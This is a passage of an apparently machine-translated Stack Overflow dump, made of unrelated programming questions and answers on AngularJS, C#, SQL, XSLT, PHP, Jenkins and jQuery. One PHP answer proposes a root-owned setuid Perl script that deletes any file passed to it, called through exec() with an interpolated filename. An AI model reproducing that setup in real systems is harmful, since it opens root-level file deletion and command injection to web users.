或者，像这样：

```
select * from
(SELECT concat(members.name, " " ,members.surname) AS i 
FROM members) con
where con.i LIKE '%string%' 
```

萨卢多斯 ;)

# javascript - 角度路由而不改变位置

> ID：15392500
> 
> 赞同：8
> 
> 时间：2013-03-13T17:37:56.240
> 
> 标签：javascript, angularjs, google-chrome-app

[Chrome 打包应用程序](http://developer.chrome.com/stable/apps/about_apps.html)具有相当严格的内容安全政策。这样做的一个结果是操纵位置（如单击链接）会导致：

```
'Can't open same-window link to "chrome-extension://lkjasdfjklbdskjasdfjkhfdshjksad/derp.html"; try target="_blank". ' 
```

Target _blank 将在 chrome 中打开链接，这不是我想要的。AngularJS 的路由能在这样一个封闭的环境中工作吗？

他们的文档给出了一个 Angular 应用程序[的示例](http://developer.chrome.com/stable/apps/angular_framework.html)，但明显不使用路由。

**更新**

这是链接，单击时会出现错误：`<a class='walrus-link' ng-href='paystubs/{{walrus.id}}'>Walrus {{id}}!</a>`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-14T02:28:27.733

不要使用 href，而是尝试使用 ng-click 并调用控制器的方法，然后使用 $location 重新定位到适当的页面。[请参阅AngularJS 站点](http://docs.angularjs.org/guide/dev_guide.services.%24location)上的文档。文档中的以下引用表明 $location 服务可能适合您：

> 我什么时候应该使用 $location？任何时候您的应用程序需要对当前 URL 的更改做出反应，或者如果您想更改浏览器中的当前 URL。

您的代码可能如下所示：

```
<a class='walrus-link' ng-click='getPaystub(walrus.id)'>Walrus {{id}}!</a> 
```

在您的父控制器中，您需要一个名为“getPaystub”的范围方法，其行类似于：

```
$scope.getPaystub = function(selectedWalrusId) {
  $location.path('paystubs/'+$scope.walrus.id);
} 
```

这种方式角度保持控制，不会导致页面刷新。这有望使您保持在 CSP 的范围内。不幸的是，我无法在打包的应用程序中对此进行测试，但我在 Web 应用程序中使用了完全相同的约定，而且效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-28T19:14:08.553

当不使用 $routeProvider 的 html5 模式（默认禁用）时，路由在我的 chrome 应用程序中对我有用，您只需在 url 中使用哈希。

所以我的链接看起来像这样：

```
<a href="#about">About</a> 
```

$routeProvider 配置如下：

```
$routeProvider.when('/about', {templateUrl:'about.html'}) 
```

# c# - 无法获得 UDP 响应

> ID：15392503
> 
> 赞同：0
> 
> 时间：2013-03-13T17:38:09.240
> 
> 标签：c#, asp.net, udp

我在 asp.net 中为我的公司创建一个网站来监控不同的服务器，但现在我被卡住了。

在一个函数中，我想要其中一台服务器的 UDP 响应时间，因为我能够发送 UDP 数据包但无法从服务器获得响应。服务器正确接收请求。我怎样才能做到这一点？

这是代码：

```
 byte[] byteData;  
    IPEndPoint ipeSender;
    EndPoint epSender;
    Socket serverSocket;
    IPEndPoint ipe;
    EndPoint eps;

    protected void Page_Load(object sender, EventArgs e)
    {

        byteData = new byte[1024];
        ipeSender = new IPEndPoint(IPAddress.Parse("192.168.4.25"), 2015);
        epSender = (EndPoint)ipeSender;
        serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        serverSocket.Bind(epSender);
        byte[] byteData1 = Encoding.ASCII.GetBytes("3^12062012152936041^OARAREGIONXWEB^SDHS^1^0^40^3^0^8^Register^");

        serverSocket.SendTo(byteData1, eps);

        ipe = new IPEndPoint(IPAddress.Parse("70.88.142.138"), 2015);
        eps = (EndPoint)ipe;
        serverSocket.BeginReceiveFrom(byteData, 0, byteData.Length, SocketFlags.None, ref epSender, new AsyncCallback(OnNetworkBytesReceived), epSender);

    }

    private void OnNetworkBytesReceived(IAsyncResult ar)
    {
        try
        {
            IPEndPoint ipeSender = new IPEndPoint(IPAddress.Any, 0);
            EndPoint epSender = (EndPoint)ipeSender;
            if (serverSocket == null)
                return;
            //if(epSender.ToString()!= dw[1, RowIndex].Value.ToString())
            //  return; // serverSocket.BeginReceiveFrom(byteData, 0, byteData.Length, SocketFlags.None, ref epSender, new AsyncCallback(OnNetworkBytesReceived), epSender);

            int DataLength = serverSocket.EndReceiveFrom(ar, ref epSender);

            byte[] TempBytes = new byte[DataLength];
            System.Buffer.BlockCopy(byteData, 0, TempBytes, 0, DataLength);

            serverSocket.BeginReceiveFrom(byteData, 0, byteData.Length, SocketFlags.None, ref epSender, new AsyncCallback(OnNetworkBytesReceived), epSender);

        }
        catch (SocketException socexp)
        {

        }
        catch (ObjectDisposedException objexp)
        {
        }
        catch (Exception exp)
        {
        }
    } 
```

# vb.net - 如何将样式应用于 Indesign 中的文本子字符串？

> ID：15392505
> 
> 赞同：1
> 
> 时间：2013-03-13T17:38:16.433
> 
> 标签：vb.net, scripting, adobe-indesign

如何从单元格中选择文本子字符串，以便应用字符样式？

当我只选择一个字符时，这很好用：

```
If IsNumeric(para.Contents.ToString.Substring(0, 1)) 
    doc.Selection = para.Characters.ItemByRange(1, 1)
    doc.Selection.Item(1).appliedCharacterStyle = mycharstyle
End If 
```

但如果我尝试选择一系列字符，它会失败

```
doc.Selection = myCell.Characters.ItemByRange(72, 76) 
```

错误是

> 对设置属性“选择”无效。预期的对象数组、对象或 idNothingEnum 枚举器，但已收到（字符、字符、字符、字符、字符）

我认为必须有一些完全不同的技术将我的 CharacterStyle 应用于我的 Cell 中的文本子字符串，但是在搜索高低之后我还没有发现它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T14:13:09.870

让它与 GREP 一起工作。

```
 app.FindGrepPreferences = idNothingEnum.idNothing
        app.ChangeGrepPreferences = idNothingEnum.idNothing
        app.FindChangeGrepOptions.IncludeFootnotes = False
        app.FindChangeGrepOptions.IncludeHiddenLayers = False
        app.FindChangeGrepOptions.IncludeLockedLayersForFind = False
        app.FindChangeGrepOptions.IncludeLockedStoriesForFind = False
        app.FindChangeGrepOptions.IncludeMasterPages = False
        mycharstyle = doc.CharacterStyles("SK-number1")
        app.ChangeGrepPreferences.AppliedCharacterStyle = mycharstyle
        app.FindGrepPreferences.FindWhat = "(?<=\t)(\d{4}.*~b)"
        doc.ChangeGrep() 
```

# python - 将具有多行的查询结果作为结果获取到单行中

> ID：15392507
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:38:23.397
> 
> 标签：python, mysql, python-2.7, tuples

反正有没有得到mysql查询结果

```
(id,result1,[result21,result22, result23]) 
```

我正在尝试检索第三列是时间戳并且对应于相同 ID 的结果。

例如，我得到的结果是

```
(21,29383)
(21,23988)
(22,23455)
(22,34564) 
```

我希望结果为

```
(21,(29383,23988))
(21,(223455,34564)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:56:05.497

我对 MySQL 不熟悉，但是如果您将结果作为 Python 元组获得，则可以在 Python 端操作数据结构。一种可能的方法是：

```
from collections import defaultdict

results = [
    (21,29383),
    (21,23988),
    (22,23455),
    (22,34564)
]

d = defaultdict(list)

for your_id, result in results:
    d[your_id].append(result)

results_as_tuples = tuple(
    sorted([
        (your_id, tuple(results)) for your_id, results in d.iteritems()
    ])
)

print results_as_tuples # --> ((21, (29383, 23988)), (22, (23455, 34564))) 
```

# servicestack - ServiceStack OrmLite中QueryById()和GetById()的区别

> ID：15392508
> 
> 赞同：4
> 
> 时间：2013-03-13T17:38:25.380
> 
> 标签：servicestack, ormlite-servicestack

任何人都可以解释 QueryById() 和 GetById() 之间的区别，因为它们都有相同的签名。并且有许多以 Query 和 Get 开头的常用功能，可能有一些我认为我缺少的主要区别。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:56:43.407

OrmLite 的**QueryById**和任何开始`Query*`或`Where*`结束的API`*Param`在幕后使用参数化查询，而其他一切都没有。

OrmLite 的项目主页上的文档中解释了更多内容：

[https://github.com/ServiceStack/ServiceStack.OrmLite/](https://github.com/ServiceStack/ServiceStack.OrmLite/)

# css - HTML DIV 内联

> ID：15392514
> 
> 赞同：0
> 
> 时间：2013-03-13T17:38:40.257
> 
> 标签：css, html

所以，我在同一行中有 2 个 DIV 元素。但是当我把内容放在第二个上时，第一个就下降了。这是代码和结果。

[jsfiddle](http://jsfiddle.net/uWkJZ/)

```
<div style="margin-top: 5px;"></div>
<div style="display: inline-block; width:250px; height:180px; background-color:#fff; box-shadow: 0 1px 5px rgba(0, 0, 0, 0.25);">
    <center>
        <div style="font-weight: bold; text-align: center; width: 250px; height: 50px; font-family: 'Droid Sans', sans-serif; color:#000; font-size:12px; border:0; height:100%; line-height: 30px;">Top 5 Números Ganhadores 1º -</div>
    </center>
</div>
<div style="display: inline-block; width:250px; height:180px; background-color:#fff; box-shadow: 0 1px 5px rgba(0, 0, 0, 0.25);">
    <center>
        <div style="font-weight: bold; text-align: center; width: 250px; height: 50px; font-family: 'Droid Sans', sans-serif; color:#000; font-size:12px; border:0; height:100%; line-height: 30px;">Top 5 Números Escolhidos
            <p>1º -</div>
    </center>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:41:29.283

这是因为你的语法有错误

```
<div style="margin-top: 5px;"> </div>
<div style="display: inline-block; width:250px; height:180px; background-color:#fff; box-shadow: 0 1px 5px rgba(0, 0, 0, 0.25);">
<center>
    <div style="font-weight: bold; text-align: center; width: 250px; height: 50px; font-family: 'Droid Sans', sans-serif; color:#000; font-size:12px; border:0; height:100%; line-height: 30px;">
        Top 5 Números Ganhadores
        1º -
    </div>
</center>
</div>
<div style="display: inline-block; width:250px; height:180px; background-color:#fff; box-shadow: 0 1px 5px rgba(0, 0, 0, 0.25);">
<center>
    <div style="font-weight: bold; text-align: center; width: 250px; height: 50px; font-family: 'Droid Sans', sans-serif; color:#000; font-size:12px; border:0; height:100%; line-height: 30px;">
        Top 5 Números Escolhidos<p>
        1º - 
    </div>
</center>
</div> 
```

您有一个在“Top 5 Números Escolhidos”之后从未关闭过的开始 P 标签

```
Top 5 Números Escolhidos<p>
        1º - 
```

删除它，你会很高兴的！

[http://jsfiddle.net/S636H/](http://jsfiddle.net/S636H/)

**编辑：**

想要在 div 中添加的不仅仅是文本？只需将两个 div 浮动到左侧，并确保关闭 p 标签。

```
<div style="margin-top: 5px;"> </div>
<div style="display: inline-block; width:250px; height:180px; background-color:#fff; box-shadow: 0 1px 5px rgba(0, 0, 0, 0.25);">
<center>
    <div style="font-weight: bold; text-align: center; width: 250px; height: 50px; font-family: 'Droid Sans', sans-serif; color:#000; font-size:12px; border:0; height:100%; line-height: 30px; float:left;">
        Top 5 Números Ganhadores
        1º -
    </div>
</center>
</div>
<div style="display: inline-block; width:250px; height:180px; background-color:#fff; box-shadow: 0 1px 5px rgba(0, 0, 0, 0.25);">
<center>
    <div style="font-weight: bold; text-align: center; width: 250px; height: 50px; font-family: 'Droid Sans', sans-serif; color:#000; font-size:12px; border:0; height:100%; line-height: 30px; float:left;">
        Top 5 Números Escolhidos<p></p>
        1º - 
    </div>
</center>
</div> 
```

[http://jsfiddle.net/48wAA/](http://jsfiddle.net/48wAA/)

或者，如果您不想浮动 div，请确保 p 标签是内联的：http: [//jsfiddle.net/CkGJf/](http://jsfiddle.net/CkGJf/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:42:00.430

您尝试做的事情的本质如下：

```
<div class="parentPanel">
    <div class="boxyPanel">The Left Div</div>
    <div class="boxyPanel">The Right Div</div>
</div> 
```

做样式的 CSS 是：

```
.parentPanel {
background-color: #f0f0f0;
overflow: auto;
text-align: center;    
}
.boxyPanel {
display: inline-block;
width: 250px;
height: 150px;
border: 1px solid blue;
} 
```

见小提琴：http: [//jsfiddle.net/audetwebdesign/GVgun/](http://jsfiddle.net/audetwebdesign/GVgun/)

# php - 删除 Web 目录之外的文件？

> ID：15392515
> 
> 赞同：0
> 
> 时间：2013-03-13T17:38:41.930
> 
> 标签：php, linux, chmod, delete-file

删除 web 目录之外的文件的解决方案是什么？它不会删除文件。

脚本将通过网络浏览器访问（仅限管理员）。

例如：

PHP 位于：`/var/www/html/delete_xx_phones.php`

```
-rwxr-xr-x 1 root root  592 Mar 13 17:18 delete_xx_phones.php 
```

`delete_xx_phones.php`代码看起来像这样：

```
 foreach(glob("/path/004*-phone.cf") as $file) { 
    unlink($file); 
  } 
```

中的文件`/path`

```
-rw-r--r--  1 root root      346 Mar 13 17:15 004aaaa-phone.cf
-rw-r--r--  1 root root      346 Mar 13 17:15 004bbaa-phone.cf 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:51:14.727

PHP 无法访问这些文件，因为它们属于`root`用户。PHP 通常以 Web 服务器的用户 ID 运行，或者如果它在命令行上运行，则在调用`php`.

从理论上讲，您可以`sudo`在 PHP 脚本中执行强制删除这些文件的操作，但这是非常糟糕的做法 - 为此您必须将 root 密码存储在 PHP 脚本中。

一个更好的方法是将文件的所有者更改为 PHP 运行的用户，或者`chmod`ing 它们以便 PHP 可以删除它们（尽管这也不是很优雅，因为您可以让机器上的每个用户都可以访问该文件）。

根据您的情况，每隔几分钟`cron`在帐户下运行并更改这些文件所有者的脚本可能是一个可行的解决方案：`root`

```
chown apache:apache /path/004*-phone.cf 
```

（替换`apache:apache`为您的 PHP 用户和/或组）

当然，如果您可以影响这些文件的创建方式，那么让它们*立即*成为正确用户的财产将是理想的选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:19:57.730

PHP 脚本通常以非 root 用户身份运行，因为它们通常由 httpd 执行。由于您的文件设置为仅对 root 用户具有写入权限，因此这是行不通的。

如果您无法永久更改文件的所有权或写入权限，您可以考虑编写一个非常短的脚本并使用提升`sudo`的权限（使用或 suid 位）执行它，而不是调用`unlink()`PHP。

对于 suid 方法，在 Perl 中编写一个简单的脚本（可能需要安装 perl-suidperl 包），删除作为参数传递的文件名：

**删除文件.pl：**

```
#!/usr/bin/perl -wT

# This is VERY insecure, so if you use it, make sure you modify it 
# to filter the filenames before putting the script on production
# machines
unlink $ARGV[ 0 ]; 
```

确保文件归 root ( `chown root delete-file.pl`) 所有，然后运行`chmod 6711 delete-file.pl`以设置其 SUID 位。之后，该文件将始终以 root 身份执行。

然后在您的 PHP 脚本中，您只需要运行`exec( "/path/delete-file.pl $filename" )`（考虑`shellescapearg()`到安全性）并且您的文件应该开始删除。

（请注意，我在这里专门使用 Perl，因为 Bash 传统上会忽略 suid 位。）

如果您觉得`sudo`使用`/etc/sudoers`. 然后，您可以执行以下操作：`exec( "/usr/bin/sudo /path/to/delete-file-script $filename" );`以提升的权限运行脚本。

# c# - 使用 sqldatasource 作为绑定时如何设置下拉列表的初始值

> ID：15392516
> 
> 赞同：0
> 
> 时间：2013-03-13T17:38:46.017
> 
> 标签：c#, asp.net

我有 2 `dropdownlist`，它们绑定到 a`SQLDataSource`并且值`2nd dropdownlist`基于 1st `dropdownlist`。问题是默认情况下`dropdownlist`显示实际值。我把初始值放在 dpsem 中，所以它工作正常。但是当我做同样的`dpsubj dropdownlist`事情时，它也会显示以前的值。

如果我选择 dpsem--4 那么 dpsubj 应该是 A,B,C，如果我选择 dpsem--6 那么 dpsubj 应该是 D,E,F。但它显示 A,B,C,D,E,F...

我知道这是与 Autopostback 相关的问题...

```
 <asp:DropDownList ID="dpsem" runat="server" Height="28px" 
                   Width="99px" AutoPostBack="True" DataSourceID="selectsemester" 
                   DataTextField="sem_no" DataValueField="sem_no" AppendDataBoundItems="true">
                  <asp:ListItem Selected="True" Value="0">-select</asp:ListItem>

            </asp:DropDownList>

     <asp:DropDownList ID="dpsubj" runat="server" Height="28px" 
                   Width="99px" AutoPostBack="True" DataSourceID="Selectscode" 
                   DataTextField="scode" DataValueField="scode" AppendDataBoundItems="true">
                  <asp:ListItem Selected="True" Value="0">-select</asp:ListItem>

            </asp:DropDownList>

 <asp:SqlDataSource ID="Selectscode" runat="server" 
        ConnectionString="<%$ ConnectionStrings:AttendenceManagementConnectionString %>" 
        SelectCommand="SELECT DISTINCT [scode] FROM [Semester_Wise_Subject] WHERE (([branch_name] = @branch_name) AND ([sem_no] = @sem_no))">
        <SelectParameters>
            <asp:ControlParameter ControlID="lbdept" DefaultValue="IT" Name="branch_name" 
                PropertyName="Text" Type="String" />
            <asp:ControlParameter ControlID="dpsem" DefaultValue="6" Name="sem_no" 
                PropertyName="SelectedValue" Type="Int32" />
        </SelectParameters>
    </asp:SqlDataSource>

    <asp:SqlDataSource ID="selectsemester" runat="server" 
        ConnectionString="<%$ ConnectionStrings:AttendenceManagementConnectionString %>" 
        SelectCommand="SELECT DISTINCT [sem_no] FROM [Batch_year]">
    </asp:SqlDataSource> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:55:53.970

我相信您必须在第一个下拉列表中创建一个 SelectedIndexChanged 事件，并让该事件在第二个下拉列表中导致数据绑定。默认情况下，如果您不希望第二个下拉菜单显示数据，请摆脱默认参数值。

如果您正在使用 ajax 做任何事情，您还需要确保第一个下拉列表也更新脚本管理器中的第二个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:59:15.707

开始`AppendDataBoundItems="false"`_`dpsubj`

由于您将此属性设置为 true，因此在数据绑定之前不会清除项目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:51:40.000

您应该使用`dpsubj.Items.Clear()`.. 然后再次在其上加载过滤后的数据`selectedindexchanged`将首先删除 dpsubj 下拉列表中的所有先前记录，然后使用代码在 dpsubj 中加载值

# mercurial-server - 水银服务器挂钩不起作用

> ID：15392518
> 
> 赞同：0
> 
> 时间：2013-03-13T17:38:49.380
> 
> 标签：mercurial-server

mercurial-server 在 Ubuntu 12.04 LTS 上运行

```
myserver@ip:/etc$ hg --version
    Mercurial Distributed SCM (version 2.0.2)
myserver@ip:/etc$ dpkg -s mercurial-server
    Package: mercurial-server
    Version: 1.2-1 
    ....

myserver@ip:/etc/mercurial-server/remote-hgrc.d$ ls -ltr
    total 12
    -rw-r--r-- 1 root root 180 Oct 10  2011 logging.rc
    -rw-r--r-- 1 root root 139 Oct 10  2011 access.rc
    -rw-r--r-- 1 root root  74 Mar 13 22:14 check.rc
myserver@ip:/etc/mercurial-server/remote-hgrc.d$ cat check.rc
    [hooks]
    pretxncommit.author_check = /SOURCE/mercurial-server/validate.sh

#manually added here too    
myserver@ip:/etc/mercurial-server/remote-hgrc.d$ cat ~hg/repos/hgadmin/.hg/hgrc
    # WARNING: when these hooks run they will entirely destroy and rewrite
    # ~/.ssh/authorized_keys

    [extensions]
    hgext.purge =

    [hooks]
    changegroup.aaaab_update = hg update -C default > /dev/null
    changegroup.aaaac_purge = hg purge --all > /dev/null
    changegroup.refreshauth = python:mercurialserver.refreshauth.hook
    pretxncommit.author_check = /SOURCE/mercurial-server/validate.sh

myserver@ip:/etc/mercurial-server/remote-hgrc.d$ cat /SOURCE/mercurial-server/validate.sh
    #!/bin/bash
    echo "REMUSR:$REMOTE_USER"
    echo "ATHR:`hg tip --template "{author}\n"`b"
    exit 1  

myserver@ip:~$ sudo -u hg cat ~hg/.ssh/authorized_keys
    no-pty,no-port-forwarding,no-X11-forwarding,no-agent-forwarding,command="/usr/share/mercurial-server/hg-ssh root/user1/user1.pub" ssh-rsa AAAAB3xOMN8ZiF user1@server.com
    no-pty,no-port-forwarding,no-X11-forwarding,no-agent-forwarding,command="/usr/share/mercurial-server/hg-ssh users/user2/user2.pub" ssh-rsa AAAAB3N..0HchQQw== user2@server.com 
```

在此之后从本地机器（Windows）我克隆了一个测试项目，更改，提交，推送并且它成功没有任何错误或消息。我尝试使用初始用户/密钥和通过 hgadmin push 添加的用户/密钥

```
 D:\hg\testproj>hg push
   pushing to ssh://hg@myserver.com/testproj
   searching for changes
   remote: adding changesets
   remote: adding manifests
   remote: adding file changes
   remote: added 1 changesets with 1 changes to 1 files 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-15T13:56:12.863

适用于

```
$ cat check.rc 
[hooks]
pretxnchangegroup.author_check = /SOURCE/mercurial-server/validate.sh 
```

不使用 pretxncommit

# xslt - 使用 XSLT 进行总和和类别分组和子分组

> ID：15392519
> 
> 赞同：0
> 
> 时间：2013-03-13T17:38:50.357
> 
> 标签：xslt, sum, xslt-grouping

使用 XSLT，如何更改以下内容：

```
<root>
  <element id="1" Team="Rangers" Season="2011" Points="12" />
  <element id="2" Team="Rangers" Season="2012" Points="5" />
  <element id="3" Team="Rangers" Season="2012" Points="3" />
  <element id="4" Team="Astros" Season="2011" Points="12" />
  <element id="5" Team="Astros" Season="2011" Points="9" />
  <element id="5" Team="Astros" Season="2012" Points="2" />
</root> 
```

进入：

```
<body>
  <h2>Rangers</h2>
  <table>
    <tr><td>2011</td><td>12</td></tr>
    <tr><td>2012</td><td>8</td></tr>
    <tr><td>Total</td><td>20</td></tr>
  <h2>Astros</h2>
  <table>
    <tr><td>2011</td><td>21</td></tr>
    <tr><td>2012</td><td>2</td></tr>
    <tr><td>Total</td><td>1227707</td></tr>
  </table>
</body> 
```

我尝试了这个示例，但它缺少所需的额外 Muenchian 分组。 [使用 XSLT 进行总和和类别分组](https://stackoverflow.com/questions/2297118/sums-and-category-grouping-with-xslt) 将不胜感激任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:52:04.080

这应该这样做：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" indent="yes" />
  <xsl:key name="kTeam" match="element" use="@Team" />
  <xsl:key name="kTeamYear" match="element" use="concat(@Team, '+', @Season)"/>

  <xsl:template match="root">
    <body>
      <xsl:apply-templates select="element[generate-id(.) = 
                                           generate-id(key('kTeam',@Team)[1])]"
                           mode="group"/>
    </body>
  </xsl:template>

  <xsl:template match="element" mode="group">
    <xsl:variable name="thisTeam" select="key('kTeam',@Team)" />
    <h2>
      <xsl:value-of select="@Team" />
    </h2>
    <table>
      <xsl:apply-templates 
        select="$thisTeam[generate-id() = 
                           generate-id(key('kTeamYear', 
                                           concat(@Team, '+', @Season))[1]
                                      )]" />
      <tr>      
        <td>
          <xsl:text>Total</xsl:text>
        </td>
        <td>
          <xsl:value-of select="sum($thisTeam/@Points)"/>
        </td>
      </tr>
    </table>
  </xsl:template>

  <xsl:template match="element">
    <xsl:variable name="thisSeason"
                  select="key('kTeamYear', concat(@Team, '+', @Season))" />
    <tr>
      <td>
        <xsl:value-of select="@Season" />
      </td>
      <td>
        <xsl:value-of select="sum($thisSeason/@Points)" />
      </td>
    </tr>
  </xsl:template>
</xsl:stylesheet> 
```

在您的示例输入上运行时，这会产生：

```
<body>
  <h2>Rangers</h2>
  <table>
    <tr>
      <td>2011</td>
      <td>12</td>
    </tr>
    <tr>
      <td>2012</td>
      <td>8</td>
    </tr>
    <tr>
      <td>Total</td>
      <td>20</td>
    </tr>
  </table>
  <h2>Astros</h2>
  <table>
    <tr>
      <td>2011</td>
      <td>21</td>
    </tr>
    <tr>
      <td>2012</td>
      <td>2</td>
    </tr>
    <tr>
      <td>Total</td>
      <td>23</td>
    </tr>
  </table>
</body> 
```

# java - 按升序对向量进行排序并保存到文本文件

> ID：15392520
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:38:52.353
> 
> 标签：java, sorting, text, vector, save

我有一个需要按升序排序的向量，因为我仍然是一个初学者，我发现要完成这项工作有点困难，我一直在尝试使用 insertElementAt 和 compareTo 来完成它，但我没有做到。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:56:18.780

您应该根据您对向量进行排序的内容来决定一个标准。您不能只比较两个对象，您应该选择“价格”或“代码”等，并根据该值比较您的对象

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:58:46.840

您可以采取两种方法：

1.  让你的`Product`类实现[`Comparable`](http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html)接口。这样，您可以实现[`compareTo`](http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html#compareTo%28T%29)作为排序操作基础的方法。此方法定义了排序，因为它通过返回正、零或负来确定哪个元素*更高*，哪个*更低*。`int``int`

2.  实现您自己的[`Comparator`](http://docs.oracle.com/javase/7/docs/api/java/util/Comparator.html). 比较器定义了一个比较方法，它以两个元素为基础，并以相同的方式比较它们`compareTo`。这里的优点是您可以通过使用不同的`Comparator`.

最后，可以通过使用任何`Collections#sort`将您的集合作为参数以及`Comparator`如果您决定使用一个参数的重载来执行排序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T18:54:41.443

使产品类可根据`code`. 您可以实现`Comparable`产品类的接口并覆盖`compareTo`方法。您的`Product`课程将如下所示：

```
import java.util.*;
class Product implements Comparable<Product>
{
    String desc, code, phrase;
    double price;

    public Product()
    {
        this.desc = "";
        this.code = ""; // later on irid jinbidel
        this. price = 0.0; 
        this.phrase = "";   
    }
    public Product(String desc, String code, String phrase, double price){
        this.desc = desc;
        this.code = code; // later on irid jinbidel
        this. price = price; 
        this.phrase = phrase;
    }
    @Override
    public String toString(){
        return code;//+", "+desc+", "+price+", "+phrase+".";

    }
    @Override
    public int compareTo(final Product obj) {
        return code.compareTo(obj.code);
    }
} 
```

在这里测试它是否正确排序是简单的演示：

```
public class TestProduct
{
    public static void main(String[] st)
    {
        Vector<Product> v = new Vector<Product>();
        for (int i = 9 ; i > 0 ; i-- )
        {
            v.add(new Product("MyProduct",i+"Product","Good Product",34.5));
        }
        System.out.println("Before sorting");//Records inserted in decreasing order of code.
        System.out.println(v);
        Collections.sort(v);
        System.out.println("After sorting");//Records showing in increasing order of code.
        System.out.println(v);
    }
} 
```

# ruby-on-rails - 如何在rails中的rspec中调试

> ID：15392523
> 
> 赞同：1
> 
> 时间：2013-03-13T17:38:56.637
> 
> 标签：ruby-on-rails, rspec, rspec-rails

我正在运行 rspec 案例，我想在终端上打印一些对象，同时运行 rspec.how to this.thanks 提前

我正在使用旧版本的 rails 并通过此命令 script/spec spec/ 运行

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:50:41.917

您应该能够`puts`在您的规范中进行调用。没有理由这不起作用

# jenkins - 如何让詹金斯根据他们的姓名模式运行工作列表？

> ID：15392524
> 
> 赞同：1
> 
> 时间：2013-03-13T17:38:59.343
> 
> 标签：jenkins, continuous-integration

我想设置 Jenkins 工作，这将根据他们的名称模式触发工作列表。例如，我需要运行由内存启动的所有作业-

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T17:23:38.217

你可以用 Groovy 做到这一点。配置“执行系统 ​​Groovy 脚本”类型的构建步骤（需要 Groovy 插件）：

```
import hudson.model.*

for (item in Hudson.instance.items.findAll()) {
  if (item.name ==~ /^Memory-.+/) {
    if (item.isBuildable()) {
      my_cause = new Cause.UserIdCause();
      item.scheduleBuild(my_cause);
    }
  }
} 
```

# sql - 如何在循环中使用动态列名？

> ID：15392530
> 
> 赞同：0
> 
> 时间：2013-03-13T17:39:13.007
> 
> 标签：sql, sql-server, tsql

我有一条 SQL 语句：

```
INSERT INTO Table1
(
  A,
  B,
  C,
  D,
)
SELECT id, name1, middlename1, lastname1 FROM Table2 
```

我想把这个 INSERT INTO 语句放在一个循环中，每次迭代时，Table2 中的列都会发生变化，例如：

```
INSERT INTO Table1
(
  A,
  B,
  C,
  D,
)
SELECT id, name2, middlename2, lastname2 FROM Table2 
```

有没有办法做到这一点？

编辑 -

`Table2`具有以下列：

```
Name1, Name2, Name3, etc. 
```

这些需要作为 ROWS 进入另一个表：

```
Name1

Name2

Name3

... 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:51:33.020

听起来您需要*取消透视*表中的表才能插入它。这会将您的转换转换为行。

根据您的 SQL Server 版本，您有不同的选择。

如果您使用的是 SQL Server 2008+，那么您可以使用`CROSS APPLY`and `VALUES`：

```
insert into table1 (A, B, C, D)
select t.id,
  c.col1,
  c.col2,
  c.col3
from yourtable t
cross apply
(
  values 
    (name1, middlename1, lastname1),
    (name2, middlename2, lastname2),
    (name3, middlename3, lastname3)
) c (col1, col2, col3); 
```

或者您可以使用`UNION ALL`查询：

```
insert into table1 (A, B, C, D)
select id, name1 col1, middlename1 col2, lastname1 col3
from yourtable
union all
select id, name2 col1, middlename2 col2, lastname2 col3
from yourtable
union all
select id, name3 col1, middlename3 col2, lastname3 col3
from yourtable 
```

# jquery - jQuery - 记住页面刷新后是否激活了定时弹出窗口

> ID：15392532
> 
> 赞同：0
> 
> 时间：2013-03-13T17:39:18.960
> 
> 标签：jquery, cookies, state, activation

我有一个包含表单的弹出覆盖页面，该页面会在 20 秒后自动出现，或者通过 div 上的单击操作显示。

我需要它工作，以便在发送表单后刷新页面时，覆盖的计时器不会再次启动，因此如果单击覆盖的链接，计时器不会继续 - 基本上我需要它要记住它是否已被触发，以便覆盖仅触发一次。

函数的jquery如下：

```
//popup button click function
  $('#popup_launcher').click(function(){
    $('#overlay').show(1000);
         $('html, body').animate({scrollTop:0}, 'slow');
      return false;
 });

 //close button click function
  $('#close').click(function(){
    $('#overlay').hide(1000);
 });

// popup timer function - change last value eg 20000 (20 seconds) to set time in milliseconds
        setTimeout(function() {  
                $('#overlay').show(1000);
                $('html, body').animate({scrollTop:0}, 'slow');
}, 20000); 
```

该页面正在此处开发（表单提交尚未激活）： [http](http://www.tjsmarketing.co.uk/testarea/newquotepage/mk2/template.php?id=75890701) ://www.tjsmarketing.co.uk/testarea/newquotepage/mk2/template.php?id= 75890701 感谢您的帮助，Aaron。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:42:43.420

```
$('#popup_launcher').one('click', (function(){
    $('#overlay').show(1000);
    $('html, body').animate({scrollTop:0}, 'slow');
    return false;
}); 
```

这将只执行一次您的点击事件，然后自行删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:46:07.933

我会使用 sessionStorage。

```
